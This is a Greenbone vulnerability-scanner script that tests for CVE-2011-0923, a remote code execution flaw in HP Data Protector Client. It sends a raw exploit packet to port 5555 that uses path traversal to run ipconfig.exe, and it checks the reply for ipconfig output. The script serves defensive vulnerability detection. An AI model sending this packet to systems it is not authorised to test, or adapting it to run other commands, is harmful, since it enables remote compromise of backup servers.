# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:hp:data_protector";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801946");
  script_version("2026-04-28T06:28:06+0000");
  script_tag(name:"last_modification", value:"2026-04-28 06:28:06 +0000 (Tue, 28 Apr 2026)");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2011-0923");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("HP (OpenView Storage) Data Protector Client 'EXEC_CMD' RCE Vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("General");
  script_dependencies("hp_data_protector_installed.nasl");
  script_require_ports("Services/hp_dataprotector", 5555);
  script_mandatory_keys("microfocus/data_protector/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary Perl code via a crafted command.");

  script_tag(name:"affected", value:"HP (OpenView Storage) Data Protector 6.11 and prior.");

  script_tag(name:"insight", value:"The specific flaw exists within the filtering of arguments to
  the 'EXEC_CMD' command. which allows remote connections to execute files within it's local bin
  directory.");

  script_tag(name:"summary", value:"HP (OpenView Storage) Data Protector is prone to a remote code
  execution (RCE) vulnerability.");

  script_tag(name:"solution", value:"Update to version A.06.20 or later.");

  script_xref(name:"URL", value:"http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-11-055/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101766/hpdp-exec.txt");
  script_xref(name:"URL", value:"http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143");

  exit(0);
}

include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( !get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

# nb: Attack string (ipconfig)
req = raw_string(0x00, 0x00, 0x00, 0xa4, 0x20, 0x32, 0x00, 0x20,
                 0x66, 0x64, 0x69, 0x73, 0x6b, 0x79, 0x6f, 0x75,
                 0x00, 0x20, 0x30, 0x00, 0x20, 0x53, 0x59, 0x53,
                 0x54, 0x45, 0x4d, 0x00, 0x20, 0x66, 0x64, 0x69,
                 0x73, 0x6b, 0x79, 0x6f, 0x75, 0x00, 0x20, 0x43,
                 0x00, 0x20, 0x32, 0x30, 0x00, 0x20, 0x66, 0x64,
                 0x69, 0x73, 0x6b, 0x79, 0x6f, 0x75, 0x00, 0x20,
                 0x50, 0x6f, 0x63, 0x00, 0x20, 0x4e, 0x54, 0x41,
                 0x55, 0x54, 0x48, 0x4f, 0x52, 0x49, 0x54, 0x59,
                 0x00, 0x20, 0x4e, 0x54, 0x41, 0x55, 0x54, 0x48,
                 0x4f, 0x52, 0x49, 0x54, 0x59, 0x00, 0x20, 0x4e,
                 0x54, 0x41, 0x55, 0x54, 0x48, 0x4f, 0x52, 0x49,
                 0x54, 0x59, 0x00, 0x20, 0x30, 0x00, 0x20, 0x30,
                 0x00, 0x20, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e,
                 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e,
                 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                 0x5c, 0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73,
                 0x5c, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33,
                 0x32, 0x5c, 0x69, 0x70, 0x63, 0x6f, 0x6e, 0x66,
                 0x69, 0x67, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x00);

send( socket:soc, data:req );

sleep( 5 );

res = recv( socket:soc, length:4096 );

len = strlen( res );
if( ! len )
  exit( 0 );

for( i = 0; i < len; i = i + 1 ) {
  if( ( ord( res[i] ) >= 61 ) ) {
    data = data + res[i];
  }
}

close( soc );

if( "WindowsIPConfiguration" >< data && "EthernetadapterLocalAreaConnection" >< data ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
